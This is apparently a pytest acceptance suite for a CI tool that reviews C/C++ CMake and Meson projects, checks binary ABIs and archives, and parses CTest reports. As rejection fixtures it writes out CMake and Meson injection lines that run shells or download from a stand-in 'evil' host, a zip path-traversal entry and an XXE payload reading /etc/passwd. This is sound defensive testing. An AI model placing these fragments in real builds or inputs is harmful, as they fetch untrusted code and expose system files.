"""Behavioral acceptance of reviewed C/C++ hosted-provider contracts."""
import hashlib
import json
import os
import re
import sys
from pathlib import Path
import shutil
import subprocess
import struct
import zipfile
from types import SimpleNamespace
import pytest
from devtool.actions_rm13_cpp import (cpp_project,inspect_cpp_job,verify_binary,verify_archive,
                                      normalize_ctest_report,CppError)
from devtool.actions_language_providers import provider_plan, ProviderError
from devtool.actions_graph_export import compile_graph,workflow_yaml,run_node
from tests.test_next03_language_providers import PIN

def git(root,*args):
 return subprocess.check_output(['git','-C',str(root),*args],text=True).strip()

def fixture(tmp_path,*,compiler='gcc',version='14',operation='test',manager='cmake',sanitizer='none'):
 root=tmp_path/'repo';root.mkdir();(root/'src').mkdir();(root/'ci').mkdir()
 (root/'src/main.cpp').write_text('extern "C" int reviewed_symbol(){return 7;}\nint main(){return reviewed_symbol()!=7;}\n')
 (root/'CMakeLists.txt').write_text('cmake_minimum_required(VERSION 3.21)\nproject(demo LANGUAGES CXX)\nenable_testing()\nadd_executable(demo src/main.cpp)\nadd_test(NAME demo_test COMMAND demo)\n')
 (root/'CMakePresets.json').write_text(json.dumps({'version':6,'configurePresets':[{'name':'ci','generator':'Ninja','binaryDir':'${sourceDir}/build/ci','cacheVariables':{'CMAKE_BUILD_TYPE':'Debug'}}]}))
 (root/'meson.build').write_text("project('demo','cpp')\napp = executable('demo', 'src/main.cpp')\ntest('demo_test',app)\n")
 (root/'ci/meson-ci.ini').write_text("[built-in options]\nbuildtype = 'debug'\n")
 meta=f'{{ci_toolchain="cpp",ci_cpp_manager="{manager}",ci_cpp_manager_version="3.31",ci_cpp_preset="ci",ci_cpp_compiler="{compiler}",ci_cpp_compiler_version="{version}",ci_cpp_build_type="Debug",ci_cpp_operation="{operation}",ci_cpp_sanitizer="{sanitizer}",ci_cpp_binary_name="demo",ci_cpp_symbols=["reviewed_symbol"]}}'
 cmd={'configure':'["cmake","--preset","ci"]','build':'["cmake","--build","build/ci"]','test':'["ctest","--test-dir","build/ci","--output-junit","dist/cpp-tests.xml"]','package':'["cmake","--build","build/ci"]','symbols':'["cmake","--build","build/ci"]'}[operation]
 outs='["dist/cpp-tests.xml"]' if operation=='test' else '["dist/demo.zip"]' if operation=='package' else '[]'
 (root/'.devtool.toml').write_text(f'''[project]
runner="python"
[workspace]
default_target="app"
[wrapper]
schema=2
[targets.app]
runner="python"
root="."
[targets.app.jobs.cpp]
runner="command"
command={cmd}
metadata={meta}
outputs={outs}
[targets.app.workflows]
ci=[{{id="cpp",ref="job:cpp",depends_on=[]}}]
''')
 (root/'devtoolw').write_text('#!/bin/sh\n')
 subprocess.run(['git','init','-q',str(root)],check=True)
 subprocess.run(['git','-C',str(root),'add','.'],check=True)
 subprocess.run(['git','-C',str(root),'-c','user.name=Test','-c','user.email=t@invalid','commit','-qm','fixture'],check=True)
 return root

def test_cmake_review_presets_sources_and_no_discovery_execution(tmp_path,monkeypatch):
 root=fixture(tmp_path)
 calls=[]
 original=subprocess.run
 def probe(args,*a,**kw):
  calls.append(args)
  if str(args[0])!='git':raise AssertionError('discovery invoked executable')
  return original(args,*a,**kw)
 monkeypatch.setattr(subprocess,'run',probe)
 p=cpp_project(root,manager='cmake',preset='ci',build_type='Debug')
 assert p['source_sha256']['CMakePresets.json']
 assert all(cmd[0]=='git' for cmd in calls)
 monkeypatch.setattr(subprocess,'run',original)
 # Changes after planning modify fingerprint, whether or not committed.
 (root/'CMakeLists.txt').write_text((root/'CMakeLists.txt').read_text()+'\n# changed\n')
 assert cpp_project(root,manager='cmake',preset='ci',build_type='Debug')['source_digest']!=p['source_digest']

@pytest.mark.parametrize('fragment',['execute_process(COMMAND sh -c evil)','file(DOWNLOAD https://evil /tmp/bad)','include(/tmp/executable)','FetchContent_Declare(foo URL https://evil)','find_package(Secret)'])
def test_cmake_injection_fails_closed(tmp_path,fragment):
 root=fixture(tmp_path)
 with (root/'CMakeLists.txt').open('a') as f:f.write('\n'+fragment+'\n')
 with pytest.raises(CppError,match='unsafe'):cpp_project(root,manager='cmake',preset='ci',build_type='Debug')

def test_cmake_presets_paths_and_symlinks(tmp_path):
 root=fixture(tmp_path)
 f=root/'CMakePresets.json';cfg=json.loads(f.read_text());cfg['configurePresets'][0]['binaryDir']='../../outside';f.write_text(json.dumps(cfg))
 with pytest.raises(CppError,match='build directory'):cpp_project(root,manager='cmake',preset='ci',build_type='Debug')
 f.unlink();f.symlink_to(root/'CMakeLists.txt')
 with pytest.raises(CppError,match='symlink'):cpp_project(root,manager='cmake',preset='ci',build_type='Debug')

def test_meson_static_profile_and_refusals(tmp_path):
 root=fixture(tmp_path)
 m=cpp_project(root,manager='meson',preset='ci',build_type='Debug')
 assert m['manager']=='meson' and m['source_sha256']['ci/meson-ci.ini']
 with (root/'meson.build').open('a') as f:f.write('\nrun_command(\'curl\',\'evil\')\n')
 with pytest.raises(CppError,match='unsafe'):cpp_project(root,manager='meson',preset='ci',build_type='Debug')

def test_compiler_sanitizer_matrix(tmp_path):
 root=fixture(tmp_path)
 meta={'ci_cpp_manager':'cmake','ci_cpp_manager_version':'3.31','ci_cpp_preset':'ci','ci_cpp_build_type':'Debug',
       'ci_cpp_compiler':'gcc','ci_cpp_compiler_version':'14','ci_cpp_operation':'test','ci_cpp_sanitizer':'address'}
 argv=['ctest','--test-dir','build/ci','--output-junit','dist/cpp-tests.xml']
 assert inspect_cpp_job(root,argv,meta)['sanitizer']=='address'
 meta['ci_cpp_compiler']='msvc';meta['ci_cpp_compiler_version']='19.4';meta['ci_cpp_sanitizer']='undefined'
 with pytest.raises(CppError,match='matrix'):inspect_cpp_job(root,argv,meta)
 meta['ci_cpp_sanitizer']='none';assert inspect_cpp_job(root,argv,meta)['abi']=='pe-x86_64'
 meta['ci_cpp_system_deps']=['untracked-library']
 with pytest.raises(CppError,match='dependencies'):inspect_cpp_job(root,argv,meta)

def _native_compiler_elf_abi(executable):
 """Use the actual compiler target, not the CI host or an assumed x86_64 default.

 We deliberately keep the expectation independent of the produced ELF bytes:
 verify_binary must still reject an executable that differs from this target.
 """
 result=subprocess.run([executable,'-dumpmachine'],check=True,capture_output=True,text=True,timeout=15)
 target=result.stdout.strip().lower().split('-',1)[0]
 if target in ('aarch64','arm64'):
  return 'elf-aarch64'
 if target in ('x86_64','amd64'):
  return 'elf-x86_64'
 pytest.fail('unreviewed native compiler target: '+result.stdout.strip())


def _different_elf_abi(abi):
 return 'elf-aarch64' if abi=='elf-x86_64' else 'elf-x86_64'


def test_compiler_target_mapping_and_refusals(monkeypatch):
 original=subprocess.run
 for triple,expected in [('x86_64-pc-linux-gnu','elf-x86_64'),
                         ('aarch64-unknown-linux-android','elf-aarch64'),
                         ('arm64-apple-darwin','elf-aarch64')]:
  monkeypatch.setattr(subprocess,'run',lambda *a,**kw:SimpleNamespace(stdout=triple+'\n'))
  assert _native_compiler_elf_abi('g++')==expected
 monkeypatch.setattr(subprocess,'run',lambda *a,**kw:SimpleNamespace(stdout='riscv64-unknown-linux-gnu\n'))
 with pytest.raises(pytest.fail.Exception,match='unreviewed native compiler target'):
  _native_compiler_elf_abi('g++')
 monkeypatch.setattr(subprocess,'run',original)


def test_both_elf_abis_reject_wrong_arch_without_native_cross_compiler(tmp_path):
 # Synthetic headers prove the verifier checks the declared ELF machine; no
 # AArch64 compiler or QEMU is needed on an x86_64 development host.
 for machine,expected in ((62,'elf-x86_64'),(183,'elf-aarch64')):
  data=bytearray(64)
  data[:4]=b'\x7fELF';data[4:6]=b'\x02\x01'
  struct.pack_into('<H',data,16,1)
  struct.pack_into('<H',data,18,machine)
  file=tmp_path/('machine-'+str(machine)+'.o');file.write_bytes(data)
  assert verify_binary(file,abi=expected)['abi']==expected
  with pytest.raises(CppError,match='architecture'):
   verify_binary(file,abi=_different_elf_abi(expected))


def test_real_native_gcc_binary_arch_and_symbols(tmp_path):
 if not shutil.which('g++'):pytest.skip('no compiler')
 root=fixture(tmp_path);binary=root/'demo'
 subprocess.run(['g++','-o',str(binary),str(root/'src/main.cpp')],check=True)
 abi=_native_compiler_elf_abi('g++')
 got=verify_binary(binary,abi=abi,symbols=['reviewed_symbol']);assert got['size']>0
 assert got['abi']==abi
 with pytest.raises(CppError,match='architecture'):verify_binary(binary,abi=_different_elf_abi(abi))
 with pytest.raises(CppError,match='symbol'):verify_binary(binary,abi=abi,symbols=['absent_symbol'])


def test_pe_macho_cross_abi_and_corruption(tmp_path):
 p=tmp_path/'demo.exe';buf=bytearray(160);buf[:2]=b'MZ';struct.pack_into('<I',buf,60,64);buf[64:68]=b'PE\0\0';struct.pack_into('<H',buf,68,0x8664);p.write_bytes(buf)
 assert verify_binary(p,abi='pe-x86_64')['abi']=='pe-x86_64'
 with pytest.raises(CppError,match='architecture'):verify_binary(p,abi='elf-x86_64')
 buf[68:70]=b'\x00\x00';p.write_bytes(buf)
 with pytest.raises(CppError,match='architecture'):verify_binary(p,abi='pe-x86_64')
 p.write_bytes(b'\xcf\xfa\xed\xfe'+struct.pack('<I',0x01000007)+b'\0'*32)
 assert verify_binary(p,abi='macho-x86_64')['abi']=='macho-x86_64'


def test_zip_ar_and_traversal_refusal(tmp_path):
 p=tmp_path/'safe.zip'
 with zipfile.ZipFile(p,'w') as z:z.writestr('bin/demo','hello')
 with pytest.raises(CppError,match='no ABI-verified'):
  verify_archive(p,expected_abi='elf-x86_64')
 with zipfile.ZipFile(p,'w') as z:z.writestr('../bad','x')
 with pytest.raises(CppError,match='unsafe'):verify_archive(p,expected_abi='elf-x86_64')
 p=tmp_path/'lib.a';p.write_bytes(b'!<arch>\n')
 with pytest.raises(CppError,match='empty'):verify_archive(p,expected_abi='elf-x86_64')


def test_ctest_counts_duplicate_fails(tmp_path):
 p=tmp_path/'test.xml';p.write_text('<testsuite tests="1" failures="0"><testcase classname="app" name="ok"/></testsuite>')
 assert normalize_ctest_report(p)['passed']==1
 p.write_text('<testsuite><testcase name="x"/><testcase name="x"/></testsuite>')
 with pytest.raises(CppError,match='duplicated'):normalize_ctest_report(p)
 p.write_text('<testsuite tests="1"><testcase name="fail"><failure/></testcase></testsuite>')
 with pytest.raises(CppError,match='failures'):normalize_ctest_report(p)
 p.write_text('<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]><testsuite/>')
 with pytest.raises(CppError,match='unsafe'):normalize_ctest_report(p)


def test_compiler_graph_host_policy_and_yaml(tmp_path):
 root=fixture(tmp_path)
 plan=provider_plan(root,target='app',workflow='ci',devtool_sha=PIN)
 assert plan['providers']==['cpp']
 graph=compile_graph(root,target='app',workflow='ci',devtool_sha=PIN)
 assert graph['jobs'][0]['cpp_compiler']=='gcc'
 yaml=workflow_yaml(graph)
 assert 'runs-on: ubuntu-24.04' in yaml
 assert 'Verify native compiler tools' in yaml
 with pytest.raises(ProviderError,match='matrix|incompatible'):compile_graph(root,target='app',workflow='ci',devtool_sha=PIN,host_profiles='windows-2022-x64')


def test_windows_msvc_job_static_bridge_and_run_guard(tmp_path):
 root=fixture(tmp_path,compiler='msvc',version='19.4')
 with pytest.raises(ProviderError,match='matrix|incompatible'):compile_graph(root,target='app',workflow='ci',devtool_sha=PIN)
 graph=compile_graph(root,target='app',workflow='ci',devtool_sha=PIN,host_profiles='windows-2022-x64')
 yaml=workflow_yaml(graph)
 assert 'runs-on: windows-2022' in yaml
 assert 'ilammy/msvc-dev-cmd@0b201ec74fa43914dc39ae48a89fd1d8cb592756' in yaml
 assert 'Scripts/python.exe' in yaml
 assert graph['jobs'][0]['cpp_abi']=='pe-x86_64'


_TERMUX_PREFIX='/data/data/com.termux/files/usr'


def _is_native_termux():
 """Use the interpreter path too: Devtool may sanitize PREFIX/TERMUX_VERSION.

 Android in Termux reports sys.platform == 'linux', so checking that field
 would silently admit its CMake configuration as an ordinary Linux host.
 """
 prefix=os.environ.get('PREFIX','')
 if prefix.rstrip('/')==_TERMUX_PREFIX or bool(os.environ.get('TERMUX_VERSION')):
  return True
 # Both Python and its executable are under Termux's prefix on native builds.
 # These checks remain valid when the Devtool job environment omits PREFIX.
 for path in (sys.prefix,sys.executable):
  if os.path.abspath(path).startswith(_TERMUX_PREFIX+'/') or os.path.abspath(path)==_TERMUX_PREFIX:
   return True
 return False


def _native_termux_runtime_api():
 """Read the real Android host SDK level, exactly as CMake does.

 Termux Clang may not define __ANDROID_API__ when invoked without a
 target API flag.  CMakeDetermineSystem.cmake 4.4 itself obtains the *host*
 version from ``getprop ro.build.version.sdk``.  Require that same live
 host property before passing CMAKE_SYSTEM_VERSION.  Never invent a value,
 fabricate an Android header, or call a host C compiler to guess an API.
 """
 # Prefer Android's system tool to a command of the same name from PATH.
 system_getprop='/system/bin/getprop'
 getprop=(system_getprop if Path(system_getprop).is_file()
          else shutil.which('getprop'))
 if not getprop:
  pytest.fail('Termux native CMake/CTest requires Android getprop ro.build.version.sdk; executable unavailable')
 argv=[getprop,'ro.build.version.sdk']
 try:
  result=subprocess.run(argv,capture_output=True,text=True,check=True,timeout=15)
 except (OSError,subprocess.CalledProcessError,subprocess.TimeoutExpired) as exc:
  pytest.fail('Termux native Android SDK getprop query failed: '+str(exc))
 raw=result.stdout.strip()
 # Full-match: reject empty, multi-valued, decorated or injected output.
 if not re.fullmatch(r'[0-9]{1,3}',raw) or not 1<=int(raw)<=200:
  pytest.fail('Termux native getprop ro.build.version.sdk returned no single valid numeric Android API level: '+repr(raw[:100]))
 return raw


def _native_ctest_configure():
 """Configure real native CTest without an Android NDK or /usr writes."""
 argv=['cmake','--preset','ci']
 if _is_native_termux():
  clang=shutil.which('clang++')
  if not clang:
   pytest.fail('Termux CMake/CTest requires native clang++ (pkg install clang); not skipping real CTest acceptance')
  # Preserve the driver symlink spelling; clang++ may point to clang-21.
  clang=os.path.abspath(clang)
  api=_native_termux_runtime_api()
  argv.extend(['-DCMAKE_CXX_COMPILER='+clang,
               '-DCMAKE_SYSTEM_VERSION='+api])
 return argv


def _run_ctest_checked(argv,root):
 """Report *both* captured streams rather than an opaque CalledProcessError."""
 try:
  return subprocess.run(argv,cwd=root,check=True,capture_output=True,text=True,timeout=120)
 except subprocess.CalledProcessError as exc:
  stdout=exc.stdout or ''
  stderr=exc.stderr or ''
  pytest.fail('native CMake/CTest failed (exit '+str(exc.returncode)+')\ncommand: '
              +repr(argv)+'\nstdout:\n'+stdout[-12000:]+'\nstderr:\n'+stderr[-12000:])
 except subprocess.TimeoutExpired as exc:
  pytest.fail('native CMake/CTest timed out: '+repr(argv)+'\nstdout: '
              +str(exc.stdout or b'')[-5000:]+'\nstderr: '+str(exc.stderr or b'')[-5000:])


def _mock_android_sdk(monkeypatch,api='36',system_getprop=False):
 """Use a synthetic getprop binary without reading the developer host."""
 real=subprocess.run
 monkeypatch.setattr(shutil,'which',lambda x:'/system/bin/getprop' if x=='getprop' else _TERMUX_PREFIX+'/bin/clang++' if x=='clang++' else None)
 if not system_getprop:
  real_is_file=Path.is_file
  monkeypatch.setattr(Path,'is_file',lambda p:False if str(p)=='/system/bin/getprop' else real_is_file(p))
 def fake(argv,*a,**kw):
  if len(argv)==2 and argv[0]=='/system/bin/getprop' and argv[1]=='ro.build.version.sdk':
   return SimpleNamespace(stdout=str(api)+'\n',stderr='',returncode=0)
  return real(argv,*a,**kw)
 monkeypatch.setattr(subprocess,'run',fake)


def test_native_ctest_termux_clang_selection(monkeypatch):
 monkeypatch.setenv('PREFIX',_TERMUX_PREFIX)
 monkeypatch.delenv('TERMUX_VERSION',raising=False)
 _mock_android_sdk(monkeypatch,'36')
 assert _native_ctest_configure()==['cmake','--preset','ci',
  '-DCMAKE_CXX_COMPILER='+_TERMUX_PREFIX+'/bin/clang++',
  '-DCMAKE_SYSTEM_VERSION=36']


def test_termux_detected_without_prefix_or_termux_version(monkeypatch):
 monkeypatch.delenv('PREFIX',raising=False)
 monkeypatch.delenv('TERMUX_VERSION',raising=False)
 monkeypatch.setattr(sys,'prefix',_TERMUX_PREFIX)
 monkeypatch.setattr(sys,'executable',_TERMUX_PREFIX+'/bin/python3.14')
 _mock_android_sdk(monkeypatch,'35')
 assert _is_native_termux()
 assert _native_ctest_configure()[-2:]==[
  '-DCMAKE_CXX_COMPILER='+_TERMUX_PREFIX+'/bin/clang++','-DCMAKE_SYSTEM_VERSION=35']


def test_native_ctest_preserves_clangpp_driver_symlink(tmp_path,monkeypatch):
 bindir=tmp_path/'termux-prefix'/'bin';bindir.mkdir(parents=True)
 (bindir/'clang-21').write_text('stub')
 (bindir/'clang++').symlink_to('clang-21')
 assert (bindir/'clang++').resolve().name=='clang-21'
 monkeypatch.setenv('PREFIX',_TERMUX_PREFIX)
 _mock_android_sdk(monkeypatch,'36')
 oldwhich=shutil.which
 monkeypatch.setattr(shutil,'which',lambda name:str(bindir/'clang++') if name=='clang++' else oldwhich(name))
 argv=_native_ctest_configure()
 assert argv==['cmake','--preset','ci','-DCMAKE_CXX_COMPILER='+str(bindir/'clang++'),'-DCMAKE_SYSTEM_VERSION=36']
 assert argv[-2].endswith('/clang++')


def test_native_ctest_host_without_termux_keeps_preset(monkeypatch):
 monkeypatch.setenv('PREFIX','/usr/local')
 monkeypatch.delenv('TERMUX_VERSION',raising=False)
 monkeypatch.setattr(sys,'prefix','/usr/local')
 monkeypatch.setattr(sys,'executable','/usr/local/bin/python3')
 assert _native_ctest_configure()==['cmake','--preset','ci']


def test_native_ctest_unsupported_termux_compiler_fails_closed(monkeypatch):
 monkeypatch.setenv('PREFIX',_TERMUX_PREFIX)
 monkeypatch.setattr(shutil,'which',lambda _:None)
 with pytest.raises(pytest.fail.Exception,match='requires native clang'):
  _native_ctest_configure()


@pytest.mark.parametrize('sdk',['','abc','36\n37','0','201','[36]','36.1','-1','9999'])
def test_native_ctest_android_api_unknown_fails_closed(monkeypatch,sdk):
 monkeypatch.setenv('PREFIX',_TERMUX_PREFIX)
 _mock_android_sdk(monkeypatch,sdk)
 with pytest.raises(pytest.fail.Exception,match='no single valid numeric Android API level'):
  _native_ctest_configure()


def test_native_ctest_android_api_getprop_failure_reports_reason(monkeypatch):
 monkeypatch.setenv('PREFIX',_TERMUX_PREFIX)
 _mock_android_sdk(monkeypatch,'36')
 def fail(argv,*a,**kw):
  raise subprocess.CalledProcessError(1,argv,output='',stderr='getprop not permitted')
 monkeypatch.setattr(subprocess,'run',fail)
 with pytest.raises(pytest.fail.Exception,match='getprop query failed'):
  _native_ctest_configure()


def test_native_ctest_android_api_getprop_missing_fails_closed(monkeypatch):
 monkeypatch.setenv('PREFIX',_TERMUX_PREFIX)
 monkeypatch.setattr(shutil,'which',lambda x:_TERMUX_PREFIX+'/bin/clang++' if x=='clang++' else None)
 real_is_file=Path.is_file
 monkeypatch.setattr(Path,'is_file',lambda p:False if str(p)=='/system/bin/getprop' else real_is_file(p))
 with pytest.raises(pytest.fail.Exception,match='executable unavailable'):
  _native_ctest_configure()


def test_native_ctest_android_api_uses_system_getprop_when_present(monkeypatch):
 monkeypatch.setenv('PREFIX',_TERMUX_PREFIX)
 monkeypatch.setattr(shutil,'which',lambda name:_TERMUX_PREFIX+'/bin/clang++' if name=='clang++' else '/fake/getprop' if name=='getprop' else None)
 real_is_file=Path.is_file
 monkeypatch.setattr(Path,'is_file',lambda p:True if str(p)=='/system/bin/getprop' else real_is_file(p))
 def fake(argv,*a,**kw):
  assert argv==['/system/bin/getprop','ro.build.version.sdk']
  return SimpleNamespace(stdout='36\n',stderr='',returncode=0)
 monkeypatch.setattr(subprocess,'run',fake)
 assert _native_ctest_configure()[-1]=='-DCMAKE_SYSTEM_VERSION=36'


def test_native_ctest_android_version_flag_is_valid_native_cmake(tmp_path):
 if not all(shutil.which(x) for x in ('cmake','ninja','clang++')):
  pytest.skip('native CMake Clang/Ninja unavailable')
 root=fixture(tmp_path)
 cmd=['cmake','--preset','ci','-DCMAKE_CXX_COMPILER='+os.path.abspath(shutil.which('clang++')),
      '-DCMAKE_SYSTEM_VERSION=36']
 _run_ctest_checked(cmd,root)
 _run_ctest_checked(['cmake','--build','build/ci'],root)
 _run_ctest_checked(['ctest','--test-dir','build/ci','--output-junit','dist/cpp-tests.xml'],root)
 assert normalize_ctest_report(root/'build/ci/dist/cpp-tests.xml')['passed']==1


def test_native_ctest_failure_emits_cmake_diagnostics(tmp_path,monkeypatch):
 cmd=['cmake','--preset','ci']
 def fail(*a,**kw):
  raise subprocess.CalledProcessError(1,cmd,output='-- Configuring incomplete',stderr='CMAKE_CXX_COMPILER test failed')
 monkeypatch.setattr(subprocess,'run',fail)
 with pytest.raises(pytest.fail.Exception,match='CMAKE_CXX_COMPILER test failed'):
  _run_ctest_checked(cmd,tmp_path)


def test_real_ctest_report_generated_by_cmake(tmp_path):
 if not (shutil.which('cmake') and shutil.which('ninja') and shutil.which('g++')):
  pytest.skip('native CMake/Ninja/C++ compiler unavailable')
 root=fixture(tmp_path)
 _run_ctest_checked(_native_ctest_configure(),root)
 _run_ctest_checked(['cmake','--build','build/ci'],root)
 (root/'dist').mkdir()
 _run_ctest_checked(['ctest','--test-dir','build/ci','--output-junit','dist/cpp-tests.xml'],root)
 # CTest writes output relative to its build directory, not caller CWD.
 assert normalize_ctest_report(root/'build/ci/dist/cpp-tests.xml')['passed']==1


def test_native_cpp_job_end_to_end_verified_report_and_handoff(tmp_path,monkeypatch):
 if not all(shutil.which(x) for x in ('gcc-14','g++-14','cmake','ctest','ninja')):pytest.skip('reviewed native compiler unavailable')
 root=fixture(tmp_path)
 graph=compile_graph(root,target='app',workflow='ci',devtool_sha=PIN)
 monkeypatch.setenv('GITHUB_SHA',git(root,'rev-parse','HEAD'))
 monkeypatch.setenv('GITHUB_RUN_ID','7712');monkeypatch.setenv('GITHUB_RUN_ATTEMPT','2')
 # The real target-local job must perform its own configure/build/test; a
 # GitHub needs edge is not a persistent CMake build tree.
 r=run_node(root,target='app',workflow='ci',devtool_sha=PIN,graph_sha=graph['graph_sha256'],
            job_id=graph['jobs'][0]['id'],inputs=tmp_path/'inputs',outputs=tmp_path/'out')
 assert r['cpp_receipts'][0]['passed']==1
 assert (tmp_path/'out'/graph['jobs'][0]['id']/'payload/dist/cpp-tests.xml').is_file()


def test_native_cpp_package_real_binary_and_owned_zip(tmp_path,monkeypatch):
 if not all(shutil.which(x) for x in ('gcc-14','g++-14','cmake','ninja')):pytest.skip('reviewed native compiler unavailable')
 root=fixture(tmp_path,operation='package')
 graph=compile_graph(root,target='app',workflow='ci',devtool_sha=PIN)
 monkeypatch.setenv('GITHUB_SHA',git(root,'rev-parse','HEAD'));monkeypatch.setenv('GITHUB_RUN_ID','7713');monkeypatch.setenv('GITHUB_RUN_ATTEMPT','1')
 result=run_node(root,target='app',workflow='ci',devtool_sha=PIN,graph_sha=graph['graph_sha256'],
                 job_id=graph['jobs'][0]['id'],inputs=tmp_path/'inputs',outputs=tmp_path/'out')
 assert result['cpp_receipts'][0]['abi']=='elf-x86_64'
 archive=root/'dist/demo.zip'
 with zipfile.ZipFile(archive) as z:
  assert z.namelist()==['bin/demo','byte-receipt.json']
  assert hashlib.sha256(z.read('bin/demo')).hexdigest()==json.loads(z.read('byte-receipt.json'))['sha256']
 assert verify_archive(archive,expected_abi='elf-x86_64')['archive_structure_verified']
 assert (tmp_path/'out'/graph['jobs'][0]['id']/'payload/dist/demo.zip').is_file()


def test_real_static_archive_member_abi_refusal(tmp_path):
 if not all(shutil.which(x) for x in ('gcc','ar')):pytest.skip('archiver unavailable')
 src=tmp_path/'lib.c';src.write_text('int reviewed_symbol(void){return 5;}\n')
 obj=tmp_path/'lib.o';lib=tmp_path/'lib.a'
 subprocess.run(['gcc','-c',str(src),'-o',str(obj)],check=True)
 subprocess.run(['ar','rcs',str(lib),str(obj)],check=True)
 abi=_native_compiler_elf_abi('gcc')
 assert verify_archive(lib,expected_abi=abi)['abi_verified_member_count']==1
 with pytest.raises(CppError,match='ABI'):verify_archive(lib,expected_abi=_different_elf_abi(abi))


def test_meson_test_job_admission_and_generated_junit_handoff(tmp_path,monkeypatch):
 from devtool import runners
 root=fixture(tmp_path,operation='test')
 config=root/'.devtool.toml';content=config.read_text()
 content=content.replace('ci_cpp_manager="cmake"','ci_cpp_manager="meson"')
 content=content.replace('ci_cpp_manager_version="3.31"','ci_cpp_manager_version="1.9"')
 content=content.replace('command=["ctest","--test-dir","build/ci","--output-junit","dist/cpp-tests.xml"]',
                         'command=["meson","test","-C","build/ci","--no-rebuild","--print-errorlogs"]')
 config.write_text(content)
 subprocess.run(['git','-C',str(root),'add','.'],check=True)
 subprocess.run(['git','-C',str(root),'-c','user.name=T','-c','user.email=t@invalid','commit','-qm','meson'],check=True)
 graph=compile_graph(root,target='app',workflow='ci',devtool_sha=PIN)
 rendered=workflow_yaml(graph)
 assert 'meson --version | grep -F 1.9' in rendered
 assert 'cmake --version | grep -F 1.9' not in rendered
 monkeypatch.setenv('GITHUB_SHA',git(root,'rev-parse','HEAD'));monkeypatch.setenv('GITHUB_RUN_ID','7714');monkeypatch.setenv('GITHUB_RUN_ATTEMPT','1')
 def run(cfg,specs,**kwargs):
  job=specs[0]
  # Mocked toolchain admission must not alter the reviewed runtime compiler pins.
  assert job.env['CC']=='gcc-14' and job.env['CXX']=='g++-14'
  assert job.env['MESON_WRAP_MODE']=='nodownload' and job.env['CCACHE_DISABLE']=='1'
  if job.argv[:2]==['meson','test']:
   p=root/'build/ci/meson-logs/testlog.junit.xml';p.parent.mkdir(parents=True,exist_ok=True)
   p.write_text('<testsuite tests="1"><testcase classname="pkg" name="ok"/></testsuite>')
  return [SimpleNamespace(returncode=0,skipped=False,output='')],''
 monkeypatch.setattr(runners,'run_specs',run)
 import devtool.actions_graph_export as g
 # This is a simulated Meson handoff, not a native GCC 14 execution test.
 # Mock both exact admission probes so the test has identical semantics on
 # Termux (no gcc-14) and Linux hosts. Real compiler refusal is tested below.
 orig=subprocess.run
 admitted=[]
 def probe(argv,*args,**kwargs):
  if argv==['gcc-14','--version']:
   admitted.append('compiler')
   return SimpleNamespace(returncode=0,stdout='gcc (GCC) 14.2.0',stderr='')
  if argv==['meson','--version']:
   admitted.append('manager')
   return SimpleNamespace(returncode=0,stdout='1.9.0',stderr='')
  return orig(argv,*args,**kwargs)
 monkeypatch.setattr(subprocess,'run',probe)
 result=run_node(root,target='app',workflow='ci',devtool_sha=PIN,graph_sha=graph['graph_sha256'],
  job_id=graph['jobs'][0]['id'],inputs=tmp_path/'inputs',outputs=tmp_path/'out')
 assert result['cpp_receipts'][0]['passed']==1
 assert (tmp_path/'out'/graph['jobs'][0]['id']/'payload/dist/cpp-tests.xml').is_file()
 assert admitted==['compiler','manager']


@pytest.mark.parametrize('compiler_probe,expected',[('missing','preinstalled compiler unavailable'),
                                                    ('wrong-version','compiler pin differs')])
def test_meson_native_compiler_refusal_before_any_job(tmp_path,monkeypatch,compiler_probe,expected):
 # The handoff test above simulates an admitted toolchain. This counterpart
 # proves that production admission is still fail-closed on the *exact* pin.
 from devtool import runners
 root=fixture(tmp_path,manager='meson',version='14',operation='test')
 config=root/'.devtool.toml'
 config.write_text(config.read_text().replace('ci_cpp_manager_version="3.31"',
                    'ci_cpp_manager_version="1.9"').replace(
                    'command=["ctest","--test-dir","build/ci","--output-junit","dist/cpp-tests.xml"]',
                    'command=["meson","test","-C","build/ci","--no-rebuild","--print-errorlogs"]'))
 subprocess.run(['git','-C',str(root),'add','.'],check=True)
 subprocess.run(['git','-C',str(root),'-c','user.name=T','-c','user.email=t@invalid','commit','-qm','meson'],check=True)
 graph=compile_graph(root,target='app',workflow='ci',devtool_sha=PIN)
 monkeypatch.setenv('GITHUB_SHA',git(root,'rev-parse','HEAD'))
 monkeypatch.setenv('GITHUB_RUN_ID','7715')
 monkeypatch.setenv('GITHUB_RUN_ATTEMPT','1')
 def forbidden(*a,**kw):
  pytest.fail('RM-13 allowed a native job despite failing compiler admission')
 monkeypatch.setattr(runners,'run_specs',forbidden)
 orig=subprocess.run
 seen=[]
 def probe(argv,*a,**kw):
  if argv==['gcc-14','--version']:
   seen.append(argv)
   if compiler_probe=='missing':
    raise FileNotFoundError('simulated missing gcc-14')
   return SimpleNamespace(returncode=0,stdout='gcc (GCC) 13.3.0',stderr='')
  if argv==['meson','--version']:
   pytest.fail('Meson version was checked after rejected compiler')
  return orig(argv,*a,**kw)
 monkeypatch.setattr(subprocess,'run',probe)
 with pytest.raises(ProviderError,match=expected):
  run_node(root,target='app',workflow='ci',devtool_sha=PIN,graph_sha=graph['graph_sha256'],
           job_id=graph['jobs'][0]['id'],inputs=tmp_path/'inputs',outputs=tmp_path/'out')
 assert seen==[['gcc-14','--version']]
 assert not (tmp_path/'out').exists()


def test_complete_native_compiler_host_matrix_and_dependency_isolation(tmp_path):
 root=fixture(tmp_path)
 p=root/'.devtool.toml';p.write_text(p.read_text().replace('ci_cpp_binary_name="demo"',
    'ci_cpp_compiler_matrix="gcc:14,clang:17,msvc:19.4",ci_cpp_binary_name="demo"'))
 subprocess.run(['git','-C',str(root),'add','.'],check=True)
 subprocess.run(['git','-C',str(root),'-c','user.name=T','-c','user.email=t@invalid','commit','-qm','matrix'],check=True)
 graph=compile_graph(root,target='app',workflow='ci',devtool_sha=PIN,
                     host_profiles='ubuntu-24.04-x64,windows-2022-x64')
 assert len(graph['jobs'])==3
 assert [(j['cpp_compiler'],j['runner']) for j in graph['jobs']]==[
  ('clang','ubuntu-24.04'),('gcc','ubuntu-24.04'),('msvc','windows-2022')]
 assert len(set(j['matrix_cell'] for j in graph['jobs']))==3
 assert len(set(j['id'] for j in graph['jobs']))==3
 assert graph['jobs'][2]['cpp_abi']=='pe-x86_64'
 assert not any(j['needs'] for j in graph['jobs'])
 render=workflow_yaml(graph)
 assert render.count('runs-on: windows-2022')==1
